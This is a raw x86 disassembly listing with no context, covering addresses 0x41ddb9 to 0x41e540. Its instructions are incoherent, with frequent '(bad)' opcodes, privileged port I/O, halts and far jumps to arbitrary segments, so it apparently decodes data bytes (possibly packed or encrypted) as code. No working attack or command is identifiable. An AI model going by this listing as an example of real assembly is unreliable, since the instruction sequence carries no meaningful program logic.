  41ddb9:	mov    DWORD PTR [edx-0x293999a4],edx
  41ddbf:	shl    DWORD PTR [ebx+0x79],1
  41ddc2:	dec    eax
  41ddc3:	inc    ebx
  41ddc4:	dec    edx
  41ddc5:	imul   esp,edi,0x5d
  41ddc8:	enter  0xe55b,0x1f
  41ddcc:	and    BYTE PTR [eax+0x13],ah
  41ddcf:	push   eax
  41ddd0:	das    
  41ddd1:	ja     0x41de0b
  41ddd3:	loop   0x41ddbc
  41ddd5:	aad    0x7
  41ddd7:	in     al,0x82
  41ddd9:	cmp    esi,ebx
  41dddb:	out    0x8f,eax
  41dddd:	test   BYTE PTR [esi+0x4c],bl
  41dde0:	hlt    
  41dde1:	arpl   WORD PTR [edi+0x0],bp
  41dde4:	cmp    eax,0xb388c2d6
  41dde9:	hlt    
  41ddea:	aad    0x86
  41ddec:	sub    DWORD PTR [ebx+0x7],0x5a096f9
  41ddf3:	test   al,0xf7
  41ddf5:	ds sub eax,0xa75f7e92
  41ddfb:	mov    ebx,0xc4c3b436
  41de00:	cmp    BYTE PTR [ecx+0x48],0x49
  41de04:	fadd   DWORD PTR [edx-0x78734ec]
  41de0a:	(bad)  
  41de0b:	pushf  
  41de0c:	mov    DWORD PTR [ecx+0xf71313a],esi
  41de12:	stos   DWORD PTR es:[edi],eax
  41de13:	mov    ch,BYTE PTR [ebx+0x507bda23]
  41de19:	add    DWORD PTR [eax-0x99828f8],edi
  41de1f:	daa    
  41de20:	jnp    0x41de31
  41de22:	adc    al,0xbc
  41de24:	dec    edx
  41de25:	and    edx,ebp
  41de27:	into   
  41de28:	xchg   ebx,esi
  41de2a:	jne    0x41de26
  41de2c:	push   ecx
  41de2d:	into   
  41de2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de2f:	sbb    BYTE PTR [edx-0x43],bh
  41de32:	pop    edi
  41de33:	sbb    esi,eax
  41de35:	mov    esp,0x73590ead
  41de3a:	jno    0x41ddd3
  41de3c:	sar    BYTE PTR [eax+edi*1],0xbe
  41de40:	pop    ds
  41de41:	mov    ds:0x42c19237,al
  41de46:	cmp    edi,DWORD PTR [eax]
  41de48:	add    eax,0xe28c6d99
  41de4d:	pop    ss
  41de4e:	jge    0x41deb9
  41de50:	mov    DWORD PTR ds:[esi+0x13eca484],eax
  41de57:	loopne 0x41de4b
  41de59:	add    ecx,DWORD PTR [esi-0x56]
  41de5c:	xchg   ecx,eax
  41de5d:	jp     0x41ddf3
  41de5f:	call   0x3df7:0xf952ddd8
  41de66:	in     eax,0xac
  41de68:	in     eax,0xee
  41de6a:	mov    al,ds:0x455bdf5e
  41de6f:	test   eax,0xe42210d0
  41de74:	aas    
  41de75:	mov    dh,bl
  41de77:	andps  xmm3,XMMWORD PTR [edx-0x1d]
  41de7b:	dec    ebp
  41de7c:	jecxz  0x41de69
  41de7e:	cwde   
  41de7f:	ja     0x41de8d
  41de81:	loope  0x41de36
  41de83:	and    ch,0x5a
  41de86:	adc    DWORD PTR [edx+0xa7d83d6],eax
  41de8c:	dec    esp
  41de8d:	jbe    0x41de87
  41de8f:	pushf  
  41de90:	xchg   ebx,eax
  41de91:	mov    cl,0x92
  41de93:	pusha  
  41de94:	fst    QWORD PTR [ecx+0x64710d3]
  41de9a:	sbb    eax,0xed7a3a2b
  41de9f:	pop    edx
  41dea0:	jo     0x41def1
  41dea2:	jmp    0x41deb5
  41dea4:	aas    
  41dea5:	jns    0x41df04
  41dea7:	(bad)  
  41dea8:	xchg   edi,eax
  41dea9:	or     esi,DWORD PTR [edx+0x48]
  41deac:	cmp    al,0x95
  41deae:	mov    bh,0x70
  41deb0:	xor    eax,0x4d712782
  41deb5:	iret   
  41deb6:	fs ja  0x41deba
  41deb9:	fsub   DWORD PTR es:[edi+0x59]
  41debd:	sbb    dh,BYTE PTR [edx+eiz*1+0x7307bb0d]
  41dec4:	aad    0x8e
  41dec6:	stos   BYTE PTR es:[edi],al
  41dec7:	mov    ebp,0x7318f842
  41decc:	mov    ds:0xe052c606,al
  41ded1:	dec    edx
  41ded2:	pop    edi
  41ded3:	mov    ah,BYTE PTR ds:0xabba66c8
  41ded9:	jae    0x41de9b
  41dedb:	xor    bh,ah
  41dedd:	sbb    DWORD PTR [ebx-0x6af2abf7],esi
  41dee3:	xchg   BYTE PTR [edx+0x72],cl
  41dee6:	ds fs addr16 add al,0xd7
  41deeb:	and    eax,0x948abb63
  41def0:	(bad)  
  41def1:	xchg   esp,eax
  41def2:	sub    BYTE PTR [ebp-0x32],bl
  41def5:	push   edx
  41def6:	popf   
  41def7:	mov    bl,0x53
  41def9:	repnz xor esp,0x1d0637e7
  41df00:	ds mov eax,0x256e5c68
  41df06:	jge    0x41ded8
  41df08:	loopne 0x41def6
  41df0a:	shl    BYTE PTR cs:[edx+0x7],0xae
  41df0f:	mov    cl,0xe1
  41df11:	mov    edx,0xf2754ce0
  41df16:	sbb    esi,DWORD PTR [eax]
  41df18:	and    esi,esi
  41df1a:	dec    ecx
  41df1b:	inc    esi
  41df1c:	rol    BYTE PTR [ecx+0x3bb20a31],1
  41df22:	mov    ecx,0xbf74adb
  41df27:	call   FWORD PTR [ebp-0x7f]
  41df2a:	or     bh,ah
  41df2c:	jp     0x41df0d
  41df2e:	push   cs
  41df2f:	or     edi,DWORD PTR fs:[ebx+ecx*2]
  41df33:	jl     0x41df5c
  41df35:	jl     0x41df0c
  41df37:	loop   0x41df58
  41df39:	mov    ds:0xa84afe1f,eax
  41df3e:	out    dx,al
  41df3f:	jl     0x41df78
  41df41:	jl     0x41df4e
  41df43:	pop    ebp
  41df44:	sar    BYTE PTR [edx+0x1c],cl
  41df47:	xchg   ebx,eax
  41df48:	mov    ecx,0xefd140d1
  41df4d:	add    BYTE PTR [edx+0x25],ah
  41df50:	sub    DWORD PTR [ecx-0x8],ebx
  41df53:	dec    eax
  41df54:	fst    st(1)
  41df56:	cmp    al,0xf9
  41df58:	pop    edi
  41df59:	leave  
  41df5a:	xchg   BYTE PTR [edx],al
  41df5c:	clc    
  41df5d:	inc    ebx
  41df5e:	push   eax
  41df5f:	sbb    al,0x5a
  41df61:	ds cwde 
  41df63:	sub    eax,DWORD PTR [edx-0x26d69b49]
  41df69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df6a:	cwde   
  41df6b:	ret    
  41df6c:	xor    al,0x1b
  41df6e:	sbb    BYTE PTR [ecx],0x19
  41df71:	sub    dl,0x7a
  41df74:	push   esp
  41df75:	add    dh,ch
  41df77:	or     eax,eax
  41df79:	div    DWORD PTR [ecx-0x2a77700]
  41df7f:	push   edx
  41df80:	jne    0x41dfa7
  41df82:	pop    ecx
  41df83:	je     0x41dfd2
  41df85:	shl    DWORD PTR [edx+0x3c],1
  41df88:	jecxz  0x41df82
  41df8a:	lahf   
  41df8b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df8e:	xor    DWORD PTR [esi+0x5b],ebx
  41df91:	js     0x41e00b
  41df93:	clc    
  41df94:	imul   ecx,DWORD PTR [edi],0x14dcaff
  41df9a:	pop    ebp
  41df9b:	push   ss
  41df9c:	jmp    0x41dfb5
  41df9e:	jle    0x41df6a
  41dfa0:	sub    bh,BYTE PTR [edi]
  41dfa2:	pusha  
  41dfa3:	sub    BYTE PTR [edi+0x8],ch
  41dfa6:	sub    esi,DWORD PTR [ebp+0x4a]
  41dfa9:	and    BYTE PTR [ebx],cl
  41dfab:	sub    BYTE PTR [edi+0x7c],al
  41dfae:	mov    esp,0xb14c4e8d
  41dfb3:	dec    ebp
  41dfb4:	sahf   
  41dfb5:	inc    esp
  41dfb6:	dec    ebp
  41dfb7:	fisttp DWORD PTR [edx-0x36]
  41dfba:	not    DWORD PTR [esi]
  41dfbc:	mov    esp,0xc860d1e7
  41dfc1:	hlt    
  41dfc2:	or     cl,BYTE PTR [ebx+0x3b]
  41dfc5:	dec    edx
  41dfc6:	xor    bl,bl
  41dfc8:	scas   eax,DWORD PTR es:[edi]
  41dfc9:	hlt    
  41dfca:	mov    ebp,0x39755064
  41dfcf:	xor    BYTE PTR [edi-0x39],dh
  41dfd2:	pushf  
  41dfd3:	leave  
  41dfd4:	shr    BYTE PTR [ebx-0x349327c1],1
  41dfda:	inc    esi
  41dfdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfdc:	and    edx,DWORD PTR [ecx+0x48]
  41dfdf:	lea    esp,[edx+0x6d9ee224]
  41dfe5:	add    al,0x51
  41dfe7:	pop    esi
  41dfe8:	jmp    0x4ef1:0xe263efb6
  41dfef:	enter  0xcea4,0xc5
  41dff3:	mov    ds:0x37569278,al
  41dff8:	lds    esi,FWORD PTR [eax]
  41dffa:	or     BYTE PTR [esi+eiz*1+0x645766c0],al
  41e001:	add    edx,DWORD PTR [ebx+0x21]
  41e004:	jnp    0x41e063
  41e006:	out    0x29,al
  41e008:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e00a:	test   al,0xd3
  41e00c:	xor    BYTE PTR [ecx],dh
  41e00e:	aaa    
  41e00f:	loope  0x41df9c
  41e011:	adc    DWORD PTR [ebx+0x53],ebp
  41e014:	bound  esi,QWORD PTR [ebx-0x47433836]
  41e01a:	adc    al,0x89
  41e01c:	adc    BYTE PTR [edx-0xa],dh
  41e01f:	fisttp DWORD PTR [edi]
  41e021:	cmc    
  41e022:	cld    
  41e023:	mov    edi,0x2d025f32
  41e028:	add    al,0x45
  41e02a:	pop    esi
  41e02b:	repnz add eax,0x9dd2e66f
  41e031:	int3   
  41e032:	push   eax
  41e033:	int3   
  41e034:	clc    
  41e035:	lea    ebp,es:[ecx+0x5c]
  41e039:	addr16 jmp 0x2f7b6b71
  41e03f:	push   ds
  41e040:	sub    eax,0xff66f886
  41e045:	push   ds
  41e046:	retf   0xd795
  41e049:	cmc    
  41e04a:	enter  0x669b,0x93
  41e04e:	push   esi
  41e04f:	out    dx,eax
  41e050:	aad    0x67
  41e052:	dec    DWORD PTR [edi]
  41e054:	xlat   BYTE PTR ds:[ebx]
  41e055:	cdq    
  41e056:	fdivr  QWORD PTR [ecx]
  41e058:	inc    eax
  41e059:	xchg   ecx,eax
  41e05a:	xchg   esp,eax
  41e05b:	outs   dx,DWORD PTR ds:[esi]
  41e05c:	enter  0x4c3e,0x5c
  41e060:	pop    ebx
  41e061:	sbb    ecx,DWORD PTR [ecx+0x1bc1fc1e]
  41e067:	xchg   esi,eax
  41e068:	pop    ds
  41e069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e06a:	xchg   edx,eax
  41e06b:	je     0x41e057
  41e06d:	loop   0x41e0a7
  41e06f:	mov    edi,0x70f86d7d
  41e074:	and    BYTE PTR ds:[edi],al
  41e077:	fadd   QWORD PTR [ecx-0x6f]
  41e07a:	mov    eax,0x68b1f8e1
  41e07f:	ss mov ecx,0xf9eaddd
  41e085:	mov    cl,0x3e
  41e087:	(bad)  
  41e088:	cmp    cl,BYTE PTR [ebx]
  41e08a:	mov    esi,0x632d978c
  41e08f:	push   ebx
  41e090:	mov    ecx,0xe121d274
  41e095:	iret   
  41e096:	push   ecx
  41e097:	adc    DWORD PTR [ebx],edi
  41e099:	gs enter 0x9a05,0xe
  41e09e:	push   ds
  41e09f:	mov    ?,WORD PTR [eax]
  41e0a1:	cli    
  41e0a2:	fdivr  DWORD PTR [edi+0x39]
  41e0a5:	xchg   esi,eax
  41e0a6:	cdq    
  41e0a7:	lds    esi,FWORD PTR [ebx+edx*1]
  41e0aa:	inc    esi
  41e0ab:	xchg   esi,eax
  41e0ac:	jns    0x41e0cf
  41e0ae:	mov    ds:0x4cab59b5,eax
  41e0b3:	pop    ecx
  41e0b4:	xchg   ecx,eax
  41e0b5:	call   0x5c4c:0x304e5958
  41e0bc:	lods   al,BYTE PTR ds:[esi]
  41e0bd:	or     cl,BYTE PTR [ecx-0x78196efd]
  41e0c3:	pop    bp
  41e0c5:	repnz xchg esp,eax
  41e0c7:	xor    DWORD PTR [ecx],esi
  41e0c9:	mov    bh,0x6f
  41e0cb:	fbstp  TBYTE PTR [ebx]
  41e0cd:	mov    al,ds:0x77082521
  41e0d2:	outs   dx,DWORD PTR ds:[esi]
  41e0d3:	cld    
  41e0d4:	fnsave fs:[ebx-0x7261ca18]
  41e0db:	aam    0x69
  41e0dd:	aam    0xef
  41e0df:	jbe    0x41e0e4
  41e0e1:	dec    edx
  41e0e2:	enter  0x60d5,0x9e
  41e0e6:	inc    eax
  41e0e7:	dec    esi
  41e0e8:	or     ebp,DWORD PTR [ebp+ebx*1-0x5d]
  41e0ec:	jecxz  0x41e0d5
  41e0ee:	jecxz  0x41e122
  41e0f0:	or     esp,DWORD PTR [ebp+0xf]
  41e0f3:	rcl    DWORD PTR [ecx+0x1c],cl
  41e0f6:	push   0xaa9eeca7
  41e0fb:	cmp    BYTE PTR [ebx-0x35],dl
  41e0fe:	jecxz  0x41e0c3
  41e100:	in     eax,dx
  41e101:	xchg   BYTE PTR [eax+0x5f],dh
  41e104:	in     al,dx
  41e105:	push   ecx
  41e106:	adc    eax,0xd2465bb6
  41e10b:	add    al,ah
  41e10d:	test   al,0x5d
  41e10f:	push   cs
  41e110:	cmc    
  41e111:	pop    ds
  41e112:	in     eax,dx
  41e113:	imul   esi,DWORD PTR ds:0x4a23be4,0xaf3d0e8
  41e11d:	dec    esi
  41e11e:	add    al,0x99
  41e120:	mov    dh,0xad
  41e122:	inc    ebx
  41e123:	mov    ecx,0x55779cf3
  41e128:	rcl    DWORD PTR [edi-0x80],cl
  41e12b:	fwait
  41e12c:	dec    edx
  41e12d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e12e:	add    ecx,DWORD PTR [esi+0x380bab82]
  41e134:	jl     0x41e147
  41e136:	loop   0x41e126
  41e138:	mov    cl,0x95
  41e13a:	mov    dl,0x46
  41e13c:	test   dl,cl
  41e13e:	icebp  
  41e13f:	cli    
  41e140:	addr16 call 0xd402:0x1b31f588
  41e148:	xchg   ebx,eax
  41e149:	xchg   edi,eax
  41e14a:	iret   
  41e14b:	mov    bl,0xc3
  41e14d:	repz xchg esp,eax
  41e14f:	pop    edi
  41e150:	pop    ecx
  41e151:	adc    BYTE PTR [edi+0x205759a3],0xd2
  41e158:	sbb    esp,esi
  41e15a:	rcl    edi,cl
  41e15c:	mov    eax,ds:0xcbff7b44
  41e161:	sbb    BYTE PTR [esi+0x32],ah
  41e164:	inc    ebp
  41e165:	mov    edx,0x556cc3fc
  41e16a:	in     eax,0x17
  41e16c:	gs jae 0x41e0f9
  41e16f:	xor    eax,DWORD PTR [edx+edi*8+0x5b90da33]
  41e176:	or     esi,DWORD PTR [esi+ebx*4-0x29]
  41e17a:	inc    esp
  41e17b:	adc    DWORD PTR [ebx],esp
  41e17d:	xchg   edi,eax
  41e17e:	jg     0x41e12e
  41e180:	shr    ecx,1
  41e182:	pop    esi
  41e183:	bound  ecx,QWORD PTR [ecx-0x67b3bb08]
  41e189:	inc    esi
  41e18a:	aam    0xf0
  41e18c:	(bad)  
  41e18d:	or     DWORD PTR [edx+0x169188c7],0xffffffa6
  41e194:	xchg   edi,eax
  41e195:	scas   al,BYTE PTR es:[edi]
  41e196:	sub    BYTE PTR [esi+edi*1-0x269e145f],ah
  41e19d:	icebp  
  41e19e:	push   0xffffffa9
  41e1a0:	pop    esp
  41e1a1:	push   0xe261c8a0
  41e1a6:	cmp    eax,0x96b410e3
  41e1ab:	icebp  
  41e1ac:	xor    ch,0x4f
  41e1af:	sub    al,0xda
  41e1b1:	(bad)  
  41e1b2:	imul   ebx,DWORD PTR [edi+0x34],0xffffffed
  41e1b6:	int3   
  41e1b7:	dec    esp
  41e1b8:	adc    dl,BYTE PTR [esi-0x18]
  41e1bb:	and    BYTE PTR [edx-0x3c],dh
  41e1be:	sub    al,0xf3
  41e1c0:	mov    cl,0x2b
  41e1c2:	sbb    al,0x78
  41e1c4:	inc    edx
  41e1c5:	rcl    DWORD PTR [eax-0x30edee66],cl
  41e1cb:	mov    cl,0xed
  41e1cd:	sub    DWORD PTR [ebx-0x3a70f8c0],ecx
  41e1d3:	cli    
  41e1d4:	jno    0x41e196
  41e1d6:	lods   eax,DWORD PTR ds:[esi]
  41e1d7:	test   al,0x11
  41e1d9:	(bad)  [eax]
  41e1db:	dec    esp
  41e1dc:	add    dh,ch
  41e1de:	dec    esp
  41e1df:	xor    ebx,DWORD PTR [ebp+0x1c018a8a]
  41e1e5:	or     dh,BYTE PTR [ebx-0xd00168d]
  41e1eb:	nop
  41e1ec:	mov    al,0x1d
  41e1ee:	inc    ecx
  41e1ef:	aad    0xd9
  41e1f1:	xchg   edi,ecx
  41e1f3:	or     eax,0xd608cb0a
  41e1f8:	jmp    0x2926ed24
  41e1fd:	(bad)  
  41e1fe:	ins    BYTE PTR es:[edi],dx
  41e1ff:	fsub   QWORD PTR [ebp-0x24]
  41e202:	jmp    0x41e1d6
  41e204:	les    eax,FWORD PTR [edi+ecx*2-0x1e06a7c5]
  41e20b:	sbb    esp,DWORD PTR [esi+ebp*4+0x26]
  41e20f:	retf   
  41e210:	dec    ebx
  41e211:	add    al,BYTE PTR [ebp-0x4af52fdb]
  41e217:	and    esp,DWORD PTR [esi]
  41e219:	inc    ebx
  41e21a:	mov    eax,ds:0xec5c7715
  41e21f:	xchg   edi,edi
  41e221:	push   eax
  41e222:	or     eax,0xa786ee82
  41e227:	call   DWORD PTR [edi]
  41e229:	outs   dx,BYTE PTR ds:[esi]
  41e22a:	lock push ds
  41e22c:	sub    ah,dl
  41e22e:	inc    edi
  41e22f:	es (bad) 
  41e231:	push   esi
  41e232:	pop    ebx
  41e233:	sub    eax,0xfca5fcf3
  41e238:	inc    ecx
  41e239:	leave  
  41e23a:	and    DWORD PTR [eax-0x2a150938],0x8b178619
  41e244:	ds stos DWORD PTR es:[edi],eax
  41e246:	js     0x41e25c
  41e248:	and    edx,DWORD PTR [eax]
  41e24a:	push   cs
  41e24b:	pop    ebp
  41e24c:	sbb    DWORD PTR [eax+ecx*1],eax
  41e24f:	jp     0x41e236
  41e251:	xchg   BYTE PTR [ebx],cl
  41e253:	sbb    al,BYTE PTR [edi-0x9]
  41e256:	and    eax,ebx
  41e258:	push   0xe59379af
  41e25d:	adc    eax,0x141856f8
  41e262:	push   edx
  41e263:	inc    eax
  41e264:	in     al,dx
  41e265:	inc    esi
  41e266:	add    al,0x93
  41e268:	retf   
  41e269:	call   0xc87:0x5bf96ae3
  41e270:	sbb    ah,BYTE PTR [esi+0x2b]
  41e273:	push   ebp
  41e274:	xor    BYTE PTR ds:0x4a4d4025,ch
  41e27a:	out    0x18,eax
  41e27c:	rcl    BYTE PTR [ecx-0x2b71bf19],1
  41e282:	push   ebp
  41e283:	xlat   BYTE PTR ds:[ebx]
  41e284:	xor    esi,DWORD PTR [edx]
  41e286:	or     BYTE PTR [ebp-0x14],cl
  41e289:	adc    DWORD PTR ds:0xf1627262,edi
  41e28f:	sti    
  41e290:	fstp   st(4)
  41e292:	lods   al,BYTE PTR ds:[esi]
  41e293:	add    ebx,ecx
  41e295:	adc    DWORD PTR [eax+0x6affda56],ecx
  41e29b:	pop    ecx
  41e29c:	dec    esp
  41e29d:	push   ss
  41e29e:	push   edx
  41e29f:	pushf  
  41e2a0:	fnstcw WORD PTR [ebp+0xe1b1518]
  41e2a6:	sti    
  41e2a7:	cmc    
  41e2a8:	repnz xor ebp,DWORD PTR [ebx-0x66]
  41e2ac:	dec    ecx
  41e2ad:	out    0x6,al
  41e2af:	jns    0x41e2d4
  41e2b1:	lods   al,BYTE PTR ds:[esi]
  41e2b2:	xor    BYTE PTR [edi+ebp*2+0x72],ch
  41e2b6:	ret    
  41e2b7:	add    ch,dh
  41e2b9:	add    ah,BYTE PTR [edx-0x182199da]
  41e2bf:	lahf   
  41e2c0:	sbb    edx,esp
  41e2c2:	jg     0x41e315
  41e2c4:	or     BYTE PTR [ebx+0x3d],dl
  41e2c7:	xor    eax,0xd430b4e4
  41e2cc:	idiv   DWORD PTR [ecx+ecx*8-0x5]
  41e2d0:	fwait
  41e2d1:	bound  ebx,QWORD PTR [esi-0x12]
  41e2d4:	and    bh,BYTE PTR [edi]
  41e2d6:	iret   
  41e2d7:	cld    
  41e2d8:	pop    ecx
  41e2d9:	mov    ecx,0xc6dd2ec9
  41e2de:	jns    0x41e2bf
  41e2e0:	imul   edi,DWORD PTR [edx+0x70],0x83d02b41
  41e2e7:	adc    BYTE PTR [edi],ch
  41e2e9:	(bad)  
  41e2ea:	call   0x6ac8:0xe60fba8f
  41e2f1:	xor    al,0x26
  41e2f3:	sub    al,BYTE PTR [esi-0x7d]
  41e2f6:	pop    esi
  41e2f7:	adc    DWORD PTR [edx+ebx*2-0x31],edi
  41e2fb:	popa   
  41e2fc:	jg     0x41e2d2
  41e2fe:	jns    0x41e306
  41e300:	xchg   ecx,eax
  41e301:	xchg   edx,eax
  41e302:	in     al,dx
  41e303:	div    BYTE PTR [edi]
  41e305:	sbb    bl,BYTE PTR [esi+0x633e8996]
  41e30b:	add    DWORD PTR [esp+ecx*2],edx
  41e30e:	mov    dh,0xd2
  41e310:	pop    es
  41e311:	pop    es
  41e312:	or     DWORD PTR [ebx],eax
  41e314:	in     al,dx
  41e315:	dec    edi
  41e316:	fcomp  DWORD PTR [ecx-0x43543898]
  41e31c:	mov    ebx,DWORD PTR ds:0x3ed49821
  41e322:	pushf  
  41e323:	ins    DWORD PTR es:[edi],dx
  41e324:	sti    
  41e325:	sbb    edi,DWORD PTR [ecx-0x1ff94685]
  41e32b:	dec    edx
  41e32c:	enter  0x19df,0xd
  41e330:	ret    0x6603
  41e333:	adc    BYTE PTR [edi],0x3a
  41e336:	xor    eax,0x96be1e2e
  41e33b:	mov    esp,0xd2d340c4
  41e340:	mov    WORD PTR [ebp+0x49],?
  41e343:	aad    0x93
  41e345:	pusha  
  41e346:	sub    al,0x80
  41e348:	popa   
  41e349:	pop    esi
  41e34a:	and    eax,0x6b4308b2
  41e34f:	scas   al,BYTE PTR es:[edi]
  41e350:	dec    BYTE PTR [edx-0x7e]
  41e353:	ret    0xe23
  41e356:	push   es
  41e357:	mov    bl,0x2d
  41e359:	adc    BYTE PTR [ecx-0x1f],dh
  41e35c:	loop   0x41e2fd
  41e35e:	mov    esi,0xd5508f69
  41e363:	add    bh,BYTE PTR [ecx-0x72c818de]
  41e369:	(bad)  
  41e36a:	sub    al,0xba
  41e36c:	in     eax,0x11
  41e36e:	int    0xc6
  41e370:	pop    edi
  41e371:	pushf  
  41e372:	add    al,0x4b
  41e374:	mov    al,ds:0xb8b7bb0
  41e379:	ret    0x5646
  41e37c:	sbb    dh,ch
  41e37e:	pop    ecx
  41e37f:	inc    ebx
  41e380:	inc    ebp
  41e381:	jne    0x41e35c
  41e383:	pop    esp
  41e384:	sbb    BYTE PTR [edx],al
  41e386:	mov    ch,0xca
  41e388:	mov    ebx,0x50690abc
  41e38d:	aad    0xa9
  41e38f:	aas    
  41e390:	pop    ds
  41e391:	jbe    0x41e321
  41e393:	call   0xf248:0x6a873b95
  41e39a:	nop
  41e39b:	enter  0x7227,0x8e
  41e39f:	aaa    
  41e3a0:	jle    0x41e3af
  41e3a2:	fwait
  41e3a3:	or     ebp,DWORD PTR [ecx]
  41e3a5:	cli    
  41e3a6:	jo     0x41e377
  41e3a8:	xor    al,0xcd
  41e3aa:	clc    
  41e3ab:	pop    ecx
  41e3ac:	(bad)  
  41e3ad:	pushf  
  41e3ae:	dec    ecx
  41e3af:	ins    DWORD PTR es:[edi],dx
  41e3b0:	push   eax
  41e3b1:	loop   0x41e3aa
  41e3b3:	aam    0xc8
  41e3b5:	mov    ch,0xc6
  41e3b7:	out    0x8,eax
  41e3b9:	xor    BYTE PTR [eax-0x3d],al
  41e3bc:	ret    0x7e48
  41e3bf:	mov    al,ds:0xaefa263e
  41e3c4:	push   ebp
  41e3c5:	jmp    0xeae:0xedbe8699
  41e3cc:	push   0x3f
  41e3ce:	mov    edi,0xd4ad53b9
  41e3d3:	js     0x41e38f
  41e3d5:	push   ecx
  41e3d6:	mov    BYTE PTR [ebp+0x38],al
  41e3d9:	test   DWORD PTR [edx+0x1],0x5d44b17b
  41e3e0:	ss mov esp,0xf2919f09
  41e3e6:	not    BYTE PTR [eax+0x773cafa0]
  41e3ec:	fnstenv [ecx]
  41e3ee:	inc    BYTE PTR [esi-0x1a]
  41e3f1:	inc    edi
  41e3f2:	xor    bl,BYTE PTR [ebx+0x32d12f56]
  41e3f8:	scas   eax,DWORD PTR es:[edi]
  41e3f9:	or     cl,BYTE PTR [ebx]
  41e3fb:	or     dh,BYTE PTR [ebx-0x37]
  41e3fe:	dec    esp
  41e3ff:	inc    esi
  41e400:	pop    es
  41e401:	mov    al,ds:0x114b59b0
  41e406:	loop   0x41e483
  41e408:	loopne 0x41e461
  41e40a:	call   0xd69b598a
  41e40f:	stc    
  41e410:	sub    al,0xe9
  41e412:	mov    WORD PTR [ebx+eax*8+0x7780e993],gs
  41e419:	pop    ebp
  41e41a:	mov    eax,ss:0xdff22de
  41e420:	adc    ecx,DWORD PTR [eax-0x471610fa]
  41e426:	pop    es
  41e427:	jnp    0x41e3de
  41e429:	sub    BYTE PTR [eax],0x6a
  41e42c:	cs aas 
  41e42e:	mov    ds:0xfe29d821,eax
  41e433:	les    edi,FWORD PTR [esp-0x1b]
  41e437:	fcom   st(0)
  41e439:	push   ebp
  41e43a:	push   eax
  41e43b:	adc    edx,DWORD PTR gs:[edx-0x171be10c]
  41e442:	or     al,0x82
  41e444:	sti    
  41e445:	and    eax,0x4a887c24
  41e44a:	(bad)  
  41e44b:	in     al,dx
  41e44c:	retf   
  41e44d:	inc    ebp
  41e44e:	mov    WORD PTR [ebx],ds
  41e450:	pop    edi
  41e451:	sub    BYTE PTR [edx+0x3b],dl
  41e454:	and    esp,DWORD PTR [esi]
  41e456:	test   DWORD PTR [ebp-0x2e],0x440beed2
  41e45d:	(bad)  
  41e45e:	in     eax,dx
  41e45f:	jo     0x41e43b
  41e461:	push   es
  41e462:	mov    ds:0xe01e0503,al
  41e467:	(bad)  
  41e468:	aam    0xbc
  41e46a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e46b:	push   0xffffff87
  41e46d:	repz push esi
  41e46f:	pop    eax
  41e470:	(bad)  
  41e471:	and    DWORD PTR [ebx+0x57],esp
  41e474:	jae    0x41e474
  41e476:	mov    ebx,ebp
  41e478:	pop    esi
  41e479:	sbb    eax,0xfda7de8e
  41e47e:	int    0xf9
  41e480:	adc    DWORD PTR [edi],0x377bb9db
  41e486:	pop    ss
  41e487:	jo     0x41e41d
  41e489:	push   esp
  41e48a:	shl    al,cl
  41e48c:	leave  
  41e48d:	push   cs
  41e48e:	or     eax,ebx
  41e490:	pushf  
  41e491:	push   es
  41e492:	out    0x77,al
  41e494:	or     esi,DWORD PTR [ecx+esi*2]
  41e497:	cmp    bl,BYTE PTR [ebx+0x1f321949]
  41e49d:	adc    eax,ecx
  41e49f:	pop    esi
  41e4a0:	pop    ebx
  41e4a1:	icebp  
  41e4a2:	pcmpeqb mm3,QWORD PTR [ecx-0x5c]
  41e4a6:	cld    
  41e4a7:	bound  edx,QWORD PTR [ebp+0x59998343]
  41e4ad:	xchg   ebx,eax
  41e4ae:	aad    0x2c
  41e4b0:	adc    ch,BYTE PTR [esi-0x60fbd28b]
  41e4b6:	lods   eax,DWORD PTR ds:[esi]
  41e4b7:	test   BYTE PTR [eax],0x8c
  41e4ba:	mov    dl,0x35
  41e4bc:	push   0xa8bd89d8
  41e4c1:	mov    ebp,0xc6d430a6
  41e4c6:	adc    BYTE PTR [ebp-0x6f56e715],ah
  41e4cc:	fs test al,0x95
  41e4cf:	pushf  
  41e4d0:	cld    
  41e4d1:	clc    
  41e4d2:	xchg   edi,eax
  41e4d3:	inc    eax
  41e4d4:	leave  
  41e4d5:	ss xchg ebx,eax
  41e4d7:	fldz   
  41e4d9:	mov    ch,0xb1
  41e4db:	mov    ds:0xdd8acce5,eax
  41e4e0:	mov    edx,eax
  41e4e2:	mul    DWORD PTR [edx+0x31]
  41e4e5:	xor    ecx,DWORD PTR [ecx-0x48]
  41e4e8:	aas    
  41e4e9:	inc    esi
  41e4ea:	fucomi st,st(2)
  41e4ec:	repnz test DWORD PTR [esi-0x3907ff66],ecx
  41e4f3:	mov    ecx,0xd88a78c5
  41e4f8:	lds    edx,FWORD PTR [edx+0x3a3f3ea7]
  41e4fe:	jecxz  0x41e487
  41e500:	std    
  41e501:	dec    ebp
  41e502:	and    BYTE PTR [edx+0x69],ch
  41e505:	call   0x8ddd3aaa
  41e50a:	xor    al,0xaf
  41e50c:	lahf   
  41e50d:	jge    0x41e4f2
  41e50f:	xor    eax,0xc98c3938
  41e514:	scas   al,BYTE PTR es:[edi]
  41e515:	xor    esi,DWORD PTR [edi]
  41e517:	adc    esp,esi
  41e519:	lds    edx,FWORD PTR [eax+0x49]
  41e51c:	mov    ah,0x97
  41e51e:	push   ds
  41e51f:	inc    edx
  41e520:	mov    ch,0x1f
  41e522:	inc    ebx
  41e523:	fisttp QWORD PTR [ebx]
  41e525:	inc    ebp
  41e526:	inc    edi
  41e527:	mov    al,0x51
  41e529:	loop   0x41e517
  41e52b:	xlat   BYTE PTR ds:[ebx]
  41e52c:	or     eax,0xc49f8f90
  41e531:	push   ds
  41e532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e533:	pop    ebp
  41e534:	adc    al,0x30
  41e536:	loopne 0x41e50f
  41e538:	call   0x70b1:0x9c499fc1
  41e53f:	pop    ecx
  41e540:	mov    esi,0xe18ea04a
